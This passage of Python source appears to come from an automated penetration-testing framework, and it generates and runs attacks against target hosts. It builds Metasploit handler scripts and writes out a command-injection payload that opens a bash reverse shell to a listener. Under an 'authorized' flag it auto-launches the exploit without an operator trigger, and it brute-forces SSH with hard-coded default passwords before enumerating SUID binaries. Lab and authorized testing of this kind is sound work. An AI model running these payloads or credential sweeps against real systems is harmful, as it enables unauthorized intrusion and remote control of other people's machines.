                    continue
            except Exception:
                pass
            existing_pending.append(_f)
        if existing_pending:
            print(f"    [MSF] Pending proposal already exists for {ip}:{port} — skipping duplicate")
            result["error"] = f"Pending proposal already exists for {ip}:{port} — skipping duplicate"
            result["success"] = False
            return result

    # ── Determine what wickets are confirmed ──────────────────────────────────
    st = states or {}
    def is_realized(wid):
        s = st.get(wid, {})
        return s.get("status") == "realized" if isinstance(s, dict) else str(s) == "realized"

    cmdi_confirmed  = is_realized("WB-14")
    sqli_confirmed  = is_realized("WB-09")
    upload_confirmed= is_realized("WB-21") or is_realized("WB-13")
    auth_confirmed  = is_realized("WB-08") or is_realized("WB-06")

    # LHOST = archbox docker bridge (where listener runs)
    LHOST = "172.17.0.1"
    LPORT = 4444

    if cmdi_confirmed:
        # ── CMDI → reverse shell via command injection ─────────────────────
        cmdi_url   = f"http://{ip}:{port}/vulnerabilities/exec/"
        payload    = f"; bash -c 'bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1'"
        rc_lines = [
            f"# CMDI confirmed (WB-14) — exploit/multi/handler for {ip}:{port}",
            f"use exploit/multi/handler",
            f"set PAYLOAD linux/x64/meterpreter/reverse_tcp",
            f"set LHOST {LHOST}",
            f"set LPORT {LPORT}",
            f"set ExitOnSession false",
            f"run -j",
            f"",
            f"# Deliver payload manually:",
            f"# URL: {cmdi_url}",
            f"# Param: ip",
            f"# Payload: {payload}",
        ]
        desc = f"exploit/multi/handler (CMDI WB-14 confirmed) against {ip}:{port} — deliver: {payload[:60]}"
        confidence = 0.92
        module_candidates = [{"module":"exploit/multi/handler","confidence":0.92,"module_class":"exploit"}]

    elif upload_confirmed and auth_confirmed:
        # ── File upload + auth → webshell upload ──────────────────────────
        rc_lines = [
            f"# File upload confirmed (WB-13/21) — webshell via upload for {ip}:{port}",
            f"use exploit/multi/handler",
            f"set PAYLOAD php/meterpreter/reverse_tcp",
            f"set LHOST {LHOST}",
            f"set LPORT {LPORT}",
            f"run -j",
            f"",
            f"# Upload webshell to: http://{ip}:{port}/vulnerabilities/upload/",
        ]
        desc = f"exploit/multi/handler (upload WB-13/21 confirmed) against {ip}:{port}"
        confidence = 0.85
        module_candidates = [{"module":"exploit/multi/handler","confidence":0.85,"module_class":"exploit"}]

    elif sqli_confirmed:
        # ── SQLi confirmed → data extraction ──────────────────────────────
        rc_lines = [
            f"# SQLi confirmed (WB-09) — extraction for {ip}:{port}",
            f"use auxiliary/scanner/http/sql_injection",
            f"set RHOSTS {ip}",
            f"set RPORT {port}",
            f"set TARGETURI /vulnerabilities/sqli/",
            f"run",
            f"",
            f"# Also try blind SQLi:",
            f"use auxiliary/scanner/http/blind_sql_query",
            f"set RHOSTS {ip}",
            f"set RPORT {port}",
            f"run",
        ]
        desc = f"SQLi extraction (WB-09 confirmed) against {ip}:{port}"
        confidence = 0.88
        module_candidates = [
            {"module":"auxiliary/scanner/http/sql_injection","confidence":0.88,"module_class":"auxiliary"},
            {"module":"auxiliary/scanner/http/blind_sql_query","confidence":0.75,"module_class":"auxiliary"},
        ]

    else:
        # ── Default: enumerate further ──────────────────────────────────────
        rc_lines = [
            f"setg RHOSTS {ip}",
            f"setg RPORT {port}",
            f"setg THREADS 4",
            f"",
            f"use auxiliary/scanner/http/http_version",
            f"set RHOSTS {ip}",
            f"set RPORT {port}",
            f"run",
            f"",
            f"use auxiliary/scanner/http/dir_scanner",
            f"set RHOSTS {ip}",
            f"set RPORT {port}",
            f"run",
            f"",
            f"exit",
        ]
        desc = f"Metasploit enumeration for {ip}:{port}"
        confidence = 0.60
        module_candidates = [
            {"module":"auxiliary/scanner/http/http_version","confidence":0.80,"module_class":"auxiliary"},
            {"module":"auxiliary/scanner/http/dir_scanner","confidence":0.60,"module_class":"auxiliary"},
        ]

    # Write RC file (always ends with newline, no bare exit on exploit paths)
    rc_file = out_dir / f"msf_{ip.replace('.','_')}_{run_id[:8]}.rc"
    rc_file.write_text("\n".join(rc_lines) + "\n")

    # Build realized list for proposal metadata
    realized_wids = [w for w in ["WB-06","WB-08","WB-09","WB-10","WB-13","WB-14","WB-21"]
                     if is_realized(w)]

    proposal = create_action(
        domain="web",
        description=desc,
        attack_surface=f"{ip}:{port}",
        hosts=[ip],
        category="runtime_observation" if not cmdi_confirmed else "exploitation",
        evidence=f"Realized: {realized_wids}" if realized_wids else f"Gravity selected MSF for {ip}:{port}",
        action={
            "instrument": "msf",
            "target_ip": ip,
            "port": port,
            "confidence": confidence,
            "rc_file": str(rc_file),
            "realized_wickets": realized_wids,
            "lhost": LHOST,
            "lport": LPORT,
            "module_candidates": module_candidates,
            "dispatch": {"kind": "msf_rc_script", "command_hint": f"msfconsole -q -r {rc_file}"},
        },
    )

    mode = "EXPLOIT (CMDI)" if cmdi_confirmed else ("EXPLOIT (upload)" if upload_confirmed else ("SQLi extraction" if sqli_confirmed else "enumeration"))
    print(f"    [MSF] Mode: {mode}")
    print(f"    [MSF] RC: {rc_file}")
    print(f"    [MSF] Proposal: {proposal['id']}")
    print(f"    [MSF] Trigger: skg proposals trigger {proposal['id']}")
    review = interactive_review(proposal["id"])
    if review.get("decision") == "approved":
        print(f"    [MSF] Approved interactively: {proposal['id']}")
    elif review.get("decision") == "rejected":
        print(f"    [MSF] Rejected interactively: {proposal['id']}")
        result["success"] = True
        result["action"] = "reviewed"
        result["proposal_id"] = proposal["id"]
        result["suggestion"] = "rejected"
        return result
    elif review.get("decision") == "deferred":
        print(f"    [MSF] Deferred interactively: {proposal['id']}")
        result["success"] = True
        result["action"] = "reviewed"
        result["proposal_id"] = proposal["id"]
        result["suggestion"] = "deferred"
        return result

    # ── Auto-execute in authorized mode for exploit paths ─────────────────
    if authorized and cmdi_confirmed:
        # Authorized engagement + confirmed CMDI = fire immediately
        # No operator trigger needed — this is the exploitation phase.
        import subprocess as _sp
        msf_bin = _sp.run(["which","msfconsole"],capture_output=True)
        if msf_bin.returncode == 0:
            log_file = out_dir / f"msf_auto_{ip.replace('.','_')}_{run_id[:8]}.log"
            _log_fh = open(log_file, "w")
            proc = _sp.Popen(
                ["msfconsole","-q","-r",str(rc_file)],
                stdin=_sp.DEVNULL,
                stdout=_log_fh,
                stderr=_sp.STDOUT,
                start_new_session=True,
                close_fds=True,
            )
            print(f"    [MSF] AUTO-EXEC PID={proc.pid}")
            print(f"    [MSF] Listener log: {log_file}")
            print(f"    [MSF] Deliver payload:")
            print(f"          URL: http://{ip}:{port}/vulnerabilities/exec/")
            print(f"          Param: ip")
            print(f"          Payload: ; bash -c 'bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1'")
            print(f"    [MSF] Then await session: skg proposals trigger {proposal['id']} --await-session")
            # Update proposal to triggered
            _p = json.loads((SKG_STATE_DIR / "proposals" / f"{proposal['id']}.json").read_text())
            # (best-effort update)
            try:
                _pf = SKG_STATE_DIR / "proposals" / f"{proposal['id']}.json"
                _pd = json.loads(_pf.read_text())
                _pd["status"] = "triggered"
                _pd["pid"] = proc.pid
                _pf.write_text(json.dumps(_pd))
            except Exception:
                pass
            result["success"]     = True
            result["action"]      = "auto_executed"
            result["rc_file"]     = str(rc_file)
            result["proposal_id"] = proposal["id"]
            result["pid"]         = proc.pid

            # Wait for session then run post-exploitation collection
            import time as _time
            print(f"    [MSF] Waiting 20s for session callback...")
            _time.sleep(20)
            print(f"    [POST-EXP] Attempting post-exploitation collection...")
            post_result = {"success": False}
            _exec_post_exploitation(ip, target, run_id, out_dir, post_result)
            if post_result.get("success"):
                result["post_events"] = post_result.get("events", 0)
                result["post_events_file"] = post_result.get("events_file","")
            return result

    result["success"]     = True
    result["action"]      = "operator"
    result["rc_file"]     = str(rc_file)
    result["proposal_id"] = proposal["id"]
    result["suggestion"]  = f"skg proposals trigger {proposal['id']}"
    return result

    # Build RC script for relevant auxiliary modules
    rc_lines = [
        f"setg RHOSTS {ip}",
        f"setg RPORT {web_ports[0]}",
        "setg THREADS 4",
        "",
        "# SQL injection scanner",
        "use auxiliary/scanner/http/sql_injection",
        f"set RHOSTS {ip}",
        f"set RPORT {web_ports[0]}",
        "set TARGETURI /",
        "run",
        "",
        "# Directory scanner",
        "use auxiliary/scanner/http/dir_scanner",
        f"set RHOSTS {ip}",
        f"set RPORT {web_ports[0]}",
        "run",
        "",
        "exit",
    ]

    rc_file = out_dir / f"msf_{ip}_{run_id[:8]}.rc"
    rc_file.write_text("\n".join(rc_lines))
    print(f"    [MSF] RC script written: {rc_file}")
    print(f"    [MSF] Run manually: msfconsole -r {rc_file}")
    print(f"    [MSF] Or: msfconsole -q -x 'resource {rc_file}'")

    # Don't auto-execute MSF — suggest to operator
    result["success"] = True
    result["action"] = "operator"
    result["rc_file"] = str(rc_file)
    result["suggestion"] = f"Run: msfconsole -r {rc_file}"

    return result


def _exec_pcap(ip, target, run_id, out_dir, result):
    """
    Capture traffic to/from the target and parse it into wicket events.

    Runs tshark synchronously (30s window) then uses net_sensor's
    _parse_tshark_fields / _flows_to_events to emit obs.attack.precondition
    events into DISCOVERY_DIR.  The next load_wicket_states() call picks
    them up so the entropy calculation reflects what was seen on the wire:
    SSH banners (HO-02), Kerberos AS-REP (AD-08), Docker API (CE-04),
    JNDI in HTTP (AP-L8), unusual outbound ports (AP-L7), etc.

    Running synchronously means gravity waits 30s but the entropy delta
    after the call is accurate — non-blocking would always read zero change.
    """
    events_file = out_dir / f"gravity_pcap_{ip}_{run_id[:8]}.ndjson"
    duration = 30

    print(f"    [PCAP] Capturing traffic to/from {ip} for {duration}s...")

    try:
        proc = subprocess.run(
            ["tshark", "-i", "any", "-f", f"host {ip}",
             "-a", f"duration:{duration}",
             "-T", "fields",
             "-e", "ip.src", "-e", "ip.dst",
             "-e", "tcp.dstport", "-e", "tcp.srcport",
             "-e", "udp.dstport", "-e", "udp.srcport",
             "-e", "ssh.protocol", "-e", "kerberos.msg_type",
             "-e", "http.request.uri", "-e", "dns.qry.name",
             "-e", "_ws.col.Protocol",
             "-E", "separator=|", "-E", "occurrence=f"],
            capture_output=True, text=True, timeout=duration + 15,
        )
        raw_output = proc.stdout
    except subprocess.TimeoutExpired:
        result["error"] = "tshark timed out"
        return result
    except FileNotFoundError:
        result["error"] = "tshark not found — install: pacman -S wireshark-cli"
        return result
    except Exception as exc:
        result["error"] = f"tshark error: {exc}"
        return result

    if not raw_output.strip():
        result["success"] = True
        result["flows"] = 0
        print(f"    [PCAP] No traffic captured")
        return result

    try:
        from skg.sensors.net_sensor import _parse_tshark_fields, _flows_to_events
        flows  = _parse_tshark_fields(raw_output)
        events = _flows_to_events(flows, seen_flows=set())
        if events:
            with open(events_file, "w") as fh:
                for ev in events:
                    # Stamp target_ip so the IP filter in _load_events_file matches
                    ev.setdefault("payload", {})["target_ip"] = ip
                    fh.write(json.dumps(ev) + "\n")
        result["success"]      = True
        result["flows"]        = len(flows)
        result["events"]       = len(events)
        result["events_file"]  = str(events_file)
        _project_gravity_events(events_file, run_id, result)
        print(f"    [PCAP] {ip}: {len(flows)} flows → {len(events)} wicket events")
    except Exception as exc:
        result["success"] = True          # capture worked even if parse failed
        result["parse_error"] = str(exc)
        print(f"    [PCAP] capture done, parse error: {exc}")

    return result


def _exec_nmap(ip, target, run_id, out_dir, result):
    """
    Run nmap version detection and emit wicket events from the results.

    Parses nmap XML output into obs.attack.precondition events:
      - Open ports    → HO-01 (reachable), HO-02 (SSH), WB-01 (web), CE-04 (Docker)
      - Service banner → WB-02 (version disclosed, feeds NVD)
      - NSE script hits → HO-06, HO-07, HO-11 (vuln indicators)

    Writes events to DISCOVERY_DIR so load_wicket_states reads them.
    """
    import xml.etree.ElementTree as ET

    xml_file    = out_dir / f"nmap_{ip}_{run_id[:8]}.xml"
    events_file = out_dir / f"gravity_nmap_{ip}_{run_id[:8]}.ndjson"

    ports = [str(svc["port"]) for svc in target.get("services", [])]
    port_arg = ",".join(ports) if ports else "22,80,443,445,2375,2376,8080,8443"

    print(f"    [NMAP] Scanning {ip} ports {port_arg} with version detection...")

    def _scan_output_summary(proc: subprocess.CompletedProcess) -> str:
        stderr = (proc.stderr or "").strip()
        stdout = (proc.stdout or "").strip()
        detail = stderr or stdout or "no scan output"
        detail = " ".join(detail.split())
        return detail[:220]

    try:
        scan = subprocess.run(
            ["nmap", "-n", "-Pn", "-sV",
             "--script=default,vulners,smb-vuln-ms17-010,smb-vuln-ms10-054,rdp-vuln-ms12-020",
             "-p", port_arg, "-oX", str(xml_file), "--open", ip],
            capture_output=True, text=True, timeout=480
        )
    except subprocess.TimeoutExpired as exc:
        if xml_file.exists() and xml_file.stat().st_size > 2000:
            scan = subprocess.CompletedProcess(
                exc.cmd or [],
                returncode=124,
                stdout=exc.stdout or "",
                stderr=exc.stderr or "",
            )
        else:
            result["error"] = "nmap timed out with no XML output"
            return result
    except FileNotFoundError:
        result["error"] = "nmap not found — install: pacman -S nmap"
        return result
    except Exception as exc:
        result["error"] = str(exc)
        return result

    if not xml_file.exists():
        result["error"] = "nmap produced no output"
        return result

    # Parse XML and emit events
    events = []
    now = iso_now()

    def _ev(wicket_id, status, rank, confidence, detail):
        return {
            "id": str(uuid.uuid4()), "ts": now,
            "type": "obs.attack.precondition",
            "source": {"source_id": "nmap", "toolchain": "skg-host-toolchain", "version": "0"},
            "payload": {
                "wicket_id": wicket_id, "status": status,
                "workload_id": f"nmap::{ip}", "target_ip": ip,
                "detail": detail, "run_id": run_id,
            },
            "provenance": {
                "evidence_rank": rank,
                "evidence": {"source_kind": "nmap_scan", "pointer": f"nmap://{ip}",
                             "collected_at": now, "confidence": confidence},
            },
        }

    try:
        tree = ET.parse(xml_file)
        root = tree.getroot()
        host_el = root.find("host")
        if host_el is None:
            result["error"] = f"nmap: {_scan_output_summary(scan)}"
            return result
        status_el = host_el.find("status")
        if status_el is not None and status_el.get("state") not in (None, "up"):
            result["error"] = f"nmap: host state={status_el.get('state')}"
            return result

        # Host is up → HO-01
        events.append(_ev("HO-01", "realized", 4, 0.95,
                          f"Host responded to nmap scan"))

        for port_el in host_el.findall(".//port"):
            portid   = port_el.get("portid", "")
            state_el = port_el.find("state")
            svc_el   = port_el.find("service")

            if state_el is None or state_el.get("state") != "open":
                continue

            svc_name    = svc_el.get("name", "") if svc_el is not None else ""
            product     = svc_el.get("product", "") if svc_el is not None else ""
            version_str = svc_el.get("version", "") if svc_el is not None else ""
            banner = f"{product} {version_str}".strip() if (product or version_str) else svc_name

            # Port-specific wickets
            if portid in ("22", "2222"):
                events.append(_ev("HO-02", "realized", 4, 0.95,
                                  f"SSH on port {portid}" + (f" — {banner}" if banner else "")))

            if portid in ("80", "443", "8080", "8443", "8000"):
                events.append(_ev("WB-01", "realized", 4, 0.90,
                                  f"Web service on port {portid}" + (f" — {banner}" if banner else "")))

            if portid in ("2375", "2376"):
                events.append(_ev("CE-04", "realized", 6, 0.98,
                                  f"Docker API exposed on port {portid} — unauthenticated socket"))

            if portid == "445":
                events.append(_ev("AD-16", "unknown", 4, 0.50,
                                  f"SMB on {portid} — signing status unknown, check with enum4linux"))
                events.append(_ev("HO-19", "realized", 4, 0.95,
                                  f"SMB service confirmed on port 445"))

            # Version disclosure (feeds NVD)
            if banner:
                events.append(_ev("WB-02", "realized", 4, 0.85,
                                  json.dumps({svc_name: banner})))

        # NSE script hits — look for vuln indicators
        for script_el in host_el.findall(".//script"):
            script_id  = script_el.get("id", "")
            script_out = script_el.get("output", "")

            if "vuln" in script_id or "CVE" in script_out:
                # Extract CVE IDs if present
                cve_ids = re.findall(r"CVE-\d{4}-\d+", script_out)
                for cve_id in cve_ids:
                    events.append(_ev(cve_id, "realized", 6, 0.75,
                                      f"nmap NSE {script_id}: {script_out[:120]}"))
                # Confirmed-vulnerable NSE scripts → HO-25
                if "VULNERABLE" in script_out or "State: VULNERABLE" in script_out:
                    events.append(_ev("HO-25", "realized", 7, 0.90,
                                      f"nmap NSE {script_id} confirmed VULNERABLE: {script_out[:200]}"))
                elif not cve_ids:
                    events.append(_ev("HO-11", "realized", 5, 0.65,
                                      f"nmap NSE {script_id}: {script_out[:120]}"))

            if "sudo" in script_out.lower() and "NOPASSWD" in script_out:
                events.append(_ev("HO-06", "realized", 5, 0.80,
                                  f"nmap NSE: sudo NOPASSWD detected"))

    except ET.ParseError as exc:
        result["error"] = f"nmap XML parse error: {exc}"
        return result

    # Write events
    if events:
        with open(events_file, "w") as fh:
            for ev in events:
                fh.write(json.dumps(ev) + "\n")

    result["success"]     = True
    result["nmap_xml"]    = str(xml_file)
    result["events"]      = len(events)
    result["events_file"] = str(events_file)
    _project_gravity_events(events_file, run_id, result)
    if scan.returncode != 0:
        result["warning"] = f"nmap exited {scan.returncode}: {_scan_output_summary(scan)}"
    _update_surface_target_record(_latest_surface_path(), ip, _parse_nmap_services(xml_file))
    print(f"    [NMAP] {ip}: {len(events)} wicket events → {events_file.name}")
    if result.get("warning"):
        print(f"      note: {result['warning']}")
    return result


def _exec_binary_analysis(ip, target, run_id, out_dir, result):
    """
    Run binary exploitation analysis on binaries found on the target.

    Gravity selects this instrument when BA-* wickets are unknown — typically
    after HO-07 (SUID binary present) or FI-04 (executable in /tmp) fires,
    which propagate intra-target to elevate BA-* priors.

    Process:
      1. Find candidate binaries via SSH (SUID bins, bins in /tmp, service exes)
      2. Fetch each binary to local /tmp via SCP
      3. Run checksec → BA-01/02/03
      4. Run rabin2 -i → BA-04 (dangerous imports)
      5. Run ltrace with crafted input → BA-05 (controlled input reachable)
      6. Run ROPgadget → BA-06 (chain constructible)
      7. Emit events to DISCOVERY_DIR

    Falls back to the exploit_dispatch analyze_binary() function if available.
    """
    import subprocess as _sp
    import shutil as _sh

    # Load SSH credentials
    targets_file = Path("/etc/skg/targets.yaml")
    ssh_target = None
    if targets_file.exists():
        try:
            import yaml
            data = yaml.safe_load(targets_file.read_text())
            for t in (data or {}).get("targets", []):
                if t.get("host") == ip:
                    ssh_target = t
                    break
        except Exception:
            pass

    workload_id  = f"binary::{ip}"
    attack_path_id = "binary_stack_overflow_v1"
    all_events: list[dict] = []

    def _ev(wid, status, rank, conf, detail):
        return {
            "id":   str(uuid.uuid4()),
            "ts":   datetime.now(timezone.utc).isoformat(),
            "type": "obs.attack.precondition",
            "source": {"source_id": "gravity.binary_analysis",
                       "toolchain": "skg-binary-toolchain", "version": "0.1.0"},
            "payload": {
                "wicket_id": wid, "status": status,
                "workload_id": workload_id, "detail": detail[:400],
                "attack_path_id": attack_path_id, "run_id": run_id,
                "observed_at": datetime.now(timezone.utc).isoformat(),
                "target_ip": ip,
            },
            "provenance": {"evidence_rank": rank,
                           "evidence": {"source_kind": "binary_scanner",
                                        "pointer": f"ssh://{ip}",
                                        "collected_at": datetime.now(timezone.utc).isoformat(),
                                        "confidence": conf}},
        }

    def _ssh_attempts():
        seen = set()
        attempts = []

        def _add(user, key=None, password=None, label=""):
            entry = (user or "", key or "", password or "")
            if entry in seen:
                return
            seen.add(entry)
            attempts.append({
                "username": user or "root",
                "key_filename": str(Path(key).expanduser()) if key else None,
                "password": password,
                "port": int((ssh_target or {}).get("port", 22) or 22),
                "label": label or (user or "root"),
            })

        if ssh_target:
            _add(
                ssh_target.get("user") or ssh_target.get("username") or "root",
                ssh_target.get("key"),
                ssh_target.get("password"),
                "targets.yaml",
            )

        for user, password in [
            ("msfadmin", "msfadmin"),
            ("user", "user"),
            ("root", "toor"),
            ("root", "root"),
            ("admin", "admin"),
        ]:
            _add(user, None, password, "lab-default")
        _add("root", None, None, "agent")
        return attempts

    def _connect_binary_ssh():
        try:
            import paramiko
        except ImportError as exc:
            return None, exc, []

        attempts = _ssh_attempts()
        last_exc = None
        for attempt in attempts:
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            try:
                kwargs = {
                    "hostname": ip,
                    "port": attempt["port"],
                    "username": attempt["username"],
                    "timeout": 15,
                    "allow_agent": True,
                    "look_for_keys": True,
                }
                if attempt.get("key_filename"):
                    kwargs["key_filename"] = attempt["key_filename"]
                    kwargs["allow_agent"] = False
                    kwargs["look_for_keys"] = False
                elif attempt.get("password") is not None:
                    kwargs["password"] = os.path.expandvars(attempt["password"])
                    kwargs["allow_agent"] = False
                    kwargs["look_for_keys"] = False
                client.connect(**kwargs)
                return client, None, attempts
            except Exception as exc:
                last_exc = exc
                try:
                    client.close()
                except Exception:
                    pass
        return None, last_exc, attempts

    # Step 1: find candidate binaries via SSH
    candidate_binaries: list[str] = []

    ssh_attempts = []
    if ssh_target or ip.startswith(("172.17.", "172.18.", "192.168.")):
        try:
            client, ssh_exc, ssh_attempts = _connect_binary_ssh()
            if client is None:
                raise ssh_exc or RuntimeError("binary SSH connection failed")

            # SUID binaries (already partially known from HO-07)
            _, stdout, _ = client.exec_command(
                "find / -perm -4000 -type f 2>/dev/null "
                "| grep -v '^/proc\\|^/sys' | head -10", timeout=30)
            candidate_binaries += [l.strip() for l in
                                    stdout.read().decode(errors="replace").splitlines()
                                    if l.strip()]

            # Executables in /tmp
            _, stdout2, _ = client.exec_command(
                "find /tmp /var/tmp -type f -executable 2>/dev/null | head -5",
                timeout=10)
            candidate_binaries += [l.strip() for l in
                                    stdout2.read().decode(errors="replace").splitlines()
                                    if l.strip()]
            client.close()
        except Exception as exc:
            print(f"    [BIN] SSH failed for {ip}: {exc}")
            if ssh_attempts:
                print("    [BIN] Tried: " + ", ".join(
                    f"{a['username']}[{a['label']}]" for a in ssh_attempts[:6]
                ))

    # Step 2: Use exploit_dispatch analyze_binary if available (skips remote fetch)
    dispatch_path = SKG_HOME / "skg-gravity" / "exploit_dispatch.py"
    if dispatch_path.exists():
        try:
            sys.path.insert(0, str(dispatch_path.parent))
            from exploit_dispatch import analyze_binary

            # For remote binaries, we need to fetch them first
            # For now emit one pass on any locally accessible path
            fetched_any = False
            for remote_path in candidate_binaries[:3]:
                local_tmp = Path(f"/tmp/skg_bin_{run_id[:8]}_{Path(remote_path).name}")
                try:
                    if candidate_binaries:
                        t, ssh_exc, _ = _connect_binary_ssh()
                        if t is None:
                            raise ssh_exc or RuntimeError("binary fetch SSH connection failed")
                        sftp = t.open_sftp()
                        sftp.get(remote_path, str(local_tmp))
                        sftp.close()
                        t.close()

                    if local_tmp.exists():
                        print(f"    [BIN] Analyzing {remote_path}...")
                        evs = analyze_binary(str(local_tmp))
                        # Stamp target_ip
                        for ev in evs:
                            ev.setdefault("payload", {})["target_ip"] = ip
                            ev["payload"]["workload_id"] = workload_id
                        all_events.extend(evs)
                        fetched_any = True
                        local_tmp.unlink(missing_ok=True)
                except Exception:
                    pass

            if not fetched_any and not candidate_binaries:
                # No binaries found — emit unknowns for all BA-* wickets
                for wid in ["BA-01","BA-02","BA-03","BA-04","BA-05","BA-06"]:
                    all_events.append(_ev(wid, "unknown", 6, 0.40,
                                         "No candidate binaries found on target"))
        except ImportError:
            pass

    if not all_events:
        # No analysis ran — emit unknowns
        for wid in ["BA-01","BA-02","BA-03","BA-04","BA-05","BA-06"]:
            all_events.append(_ev(wid, "unknown", 6, 0.40,
                                  "Binary analysis tools not available "
                                  "(install: checksec rabin2 ROPgadget)"))
        result["success"] = False
        result["action"]  = "operator"
        result["suggestion"] = (
            f"Provide SSH creds or fetch a binary locally, then: "
            f"skg exploit binary /path/to/suid_binary"
        )

    if all_events:
        ev_file = out_dir / f"gravity_binary_{ip.replace('.','_')}_{run_id[:8]}.ndjson"
        with open(ev_file, "w") as fh:
            for ev in all_events:
                fh.write(json.dumps(ev) + "\n")
        r = sum(1 for e in all_events if e["payload"]["status"] == "realized")
        b = sum(1 for e in all_events if e["payload"]["status"] == "blocked")
        u = sum(1 for e in all_events if e["payload"]["status"] == "unknown")
        print(f"    [BIN] {ip}: {len(all_events)} BA-* events ({r}R {b}B {u}U)")
        result["success"]     = True
        result["events"]      = len(all_events)
        result["events_file"] = str(ev_file)
        try:
            EVENTS_DIR.mkdir(parents=True, exist_ok=True)
            (EVENTS_DIR / ev_file.name).write_text(ev_file.read_text())
        except Exception:
            pass
        _project_gravity_events(ev_file, run_id, result)

    return result


def _exec_iot_firmware(ip, target, run_id, out_dir, result):
    """Run the IoT firmware probe against ip (live) or a local firmware image."""
    probe_path = SKG_HOME / "skg-iot_firmware-toolchain" / "adapters" / "firmware_probe" / "probe.py"
    try:
        firmware_probe = _load_module_from_file("skg_iot_firmware_probe", probe_path)
        probe_device = firmware_probe.probe_device
        probe_from_image = firmware_probe.probe_from_image
        probe_network_only = getattr(firmware_probe, "probe_network_only", None)
    except Exception:
        result["error"] = "firmware_probe adapter not found at /opt/skg"
        return result

    targets_file = Path("/etc/skg/targets.yaml")
    ssh_target   = None
    if targets_file.exists():
        try:
            import yaml
            data = yaml.safe_load(targets_file.read_text())
            for t in (data or {}).get("targets", []):
                if t.get("host") == ip:
                    ssh_target = t
                    break
        except Exception:
            pass

    workload_id = f"iot::{ip}"
    apid        = "iot_firmware_network_exploit_v1"

    if ssh_target:
        events = probe_device(
            host=ip, user=ssh_target.get("user", "root"),
            password=ssh_target.get("password", ""),
            port_ssh=int(ssh_target.get("port", 22)),
            workload_id=workload_id, run_id=run_id,
            attack_path_id=apid,
        )
    else:
        # No SSH creds — try local firmware image
        image_candidates = (
            list(SKG_STATE_DIR.glob(f"firmware_{ip.replace('.','_')}*.bin")) +
            list(SKG_STATE_DIR.glob("firmware_*.bin"))
        )
        if image_candidates:
            events = probe_from_image(
                str(image_candidates[0]), workload_id=workload_id,
                run_id=run_id, attack_path_id=apid,
            )
        else:
            # No SSH creds and no firmware image — fall back to network-only probe.
            # The instrument observes what it can reach: banner grabs and HTTP probes
            # on known IoT ports give us version strings and exposed interfaces.
            try:
                if probe_network_only is None:
                    raise RuntimeError("probe_network_only not available")
                events = probe_network_only(
                    host=ip,
                    ports=[svc.get("port") for svc in target.get("services", [])
                           if svc.get("port")],
                    workload_id=workload_id, run_id=run_id,
                    attack_path_id=apid,
                )
            except Exception as _ne:
                result["success"]    = False
                result["action"]     = "operator"
                result["suggestion"] = (
                    f"Add {ip} to /etc/skg/targets.yaml for SSH access. "
                    f"Network probe failed: {_ne}"
                )
                return result

    if not events:
        result["success"] = True
        result["events"]  = 0
        return result

    ev_file = out_dir / f"gravity_iot_{ip.replace('.','_')}_{run_id[:8]}.ndjson"
    with open(ev_file, "w") as fh:
        for ev in events:
            ev.setdefault("payload", {})["target_ip"] = ip
            fh.write(json.dumps(ev) + "\n")

    r = sum(1 for e in events if e["payload"]["status"] == "realized")
    b = sum(1 for e in events if e["payload"]["status"] == "blocked")
    u = sum(1 for e in events if e["payload"]["status"] == "unknown")
    print(f"    [IOT] {ip}: {len(events)} events ({r}R {b}B {u}U)")

    result["success"]     = True
    result["events"]      = len(events)
    result["events_file"] = str(ev_file)
    _project_gravity_events(ev_file, run_id, result)
    return result


def _exec_supply_chain(ip, target, run_id, out_dir, result):
    """Run the supply chain SBOM check against a target."""
    import sys as _sys
    _sys.path.insert(0, "/opt/skg/skg-supply-chain-toolchain/adapters/sbom_check")
    try:
        from check import evaluate_packages, collect_via_ssh
    except ImportError:
        result["error"] = "sbom_check adapter not found"
        return result

    targets_file = Path("/etc/skg/targets.yaml")
    ssh_target   = None
    if targets_file.exists():
        try:
            import yaml
            data = yaml.safe_load(targets_file.read_text())
            for t in (data or {}).get("targets", []):
                if t.get("host") == ip:
                    ssh_target = t
                    break
        except Exception:
            pass

    workload_id = f"supply_chain::{ip}"
    apid        = "supply_chain_rce_via_dependency_v1"

    if not ssh_target:
        result["success"]    = False
        result["action"]     = "operator"
        result["suggestion"] = (
            f"Add {ip} to /etc/skg/targets.yaml to enable supply chain analysis, "
            f"or use: skg supply --host {ip}"
        )
        return result

    try:
        packages = collect_via_ssh(
            host=ip, user=ssh_target.get("user","root"),
            key=ssh_target.get("key"), password=ssh_target.get("password"),
            port=int(ssh_target.get("port",22)),
        )
        events = evaluate_packages(packages, workload_id=workload_id,
                                   run_id=run_id, attack_path_id=apid)
    except Exception as exc:
        result["error"] = f"supply_chain collection failed: {exc}"
        return result

    if not events:
        result["success"] = True
        result["events"]  = 0
        return result

    ev_file = out_dir / f"gravity_sc_{ip.replace('.','_')}_{run_id[:8]}.ndjson"
    with open(ev_file, "w") as fh:
        for ev in events:
            ev.setdefault("payload", {})["target_ip"] = ip
            fh.write(json.dumps(ev) + "\n")

    r = sum(1 for e in events if e["payload"]["status"] == "realized")
    b = sum(1 for e in events if e["payload"]["status"] == "blocked")
    u = sum(1 for e in events if e["payload"]["status"] == "unknown")
    print(f"    [SC] {ip}: {len(events)} events ({r}R {b}B {u}U)")

    result["success"]     = True
    result["events"]      = len(events)
    result["events_file"] = str(ev_file)
    try:
        EVENTS_DIR.mkdir(parents=True, exist_ok=True)
        (EVENTS_DIR / ev_file.name).write_text(ev_file.read_text())
    except Exception:
        pass
    _project_gravity_events(ev_file, run_id, result)
    return result


def _exec_sysaudit(ip, target, run_id, out_dir, result):
    """
    Run the sysaudit adapter against the target via SSH.

    Loads credentials from targets.yaml, opens a paramiko session, calls
    run_sysaudit() which executes all FI/PI/LI checks on the remote host,
    writes events to DISCOVERY_DIR with target_ip stamped.

    Gravity selects this instrument when FI-*, PI-*, or LI-* wickets are
    unknown — the same wavelength-matching logic that selects http_collector
    for WB-* unknowns. The entropy reduction signal is real: after a first
    run all wickets collapse to realized/blocked/unknown based on live state.
    Subsequent runs detect changes (new SUID, crontab modification, log shrink).

    Falls back to an operator suggestion if no credentials are configured.
    """
    import sys as _sys

    try:
        import paramiko
    except ImportError:
        result["error"] = "paramiko not installed"
        return result

    client, used, last_exc = _connect_ssh_with_fallback(
        ip, f"audit::{ip}", "full_system_integrity_v1"
    )
    if client is None or used is None:
        result["error"] = f"SSH connect failed: {last_exc}"
        return result

    workload_id = used["workload_id"]
